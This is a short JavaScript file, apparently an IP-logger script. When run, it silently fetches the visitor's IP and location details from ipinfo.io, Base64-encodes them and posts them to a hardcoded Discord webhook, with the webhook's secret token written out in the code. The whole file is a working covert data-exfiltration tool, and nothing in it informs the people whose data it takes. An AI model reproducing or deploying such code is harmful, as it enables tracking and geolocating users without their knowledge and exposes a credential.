// Function to send a message to Discord Webhook
async function sendToDiscord(webhookUrl, message) {
    const data = {
      content: message,
    };
  
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
  
    if (response.ok) {
      console.log('Message sent successfully to Discord!');
      console.log(response);
    } else {
      console.error('Error sending message to Discord:', response.statusText);
    }
  }
  
  // Function to fetch IP info and send it to Discord
  async function fetchAndSendData() {
    try {
      // Get the IP info data
      const response = await fetch('https://ipinfo.io/json');
      const data = await response.json();
  
      // Convert the object to a string and then encode it in Base64
      const jsonString = JSON.stringify(data);
      const base64Encoded = btoa(jsonString);
  
      // Discord webhook URL (replace with your actual webhook URL)
      const webhookUrl = 'https://discord.com/api/webhooks/1356684349377876040/uQZ96BItl8Eob6QXPzzyD1WXpBQx4QOAdpOjkKLcghlXrTyqniTInCfjMDCPP5Tn2dBW';
  
      // Send the Base64 encoded string to the Discord webhook
      await sendToDiscord(webhookUrl, base64Encoded);
    } catch (error) {
      console.error('Error fetching IP info:', error);
    }
  }
  
  // Run the function to fetch data and send it to Discord
  fetchAndSendData();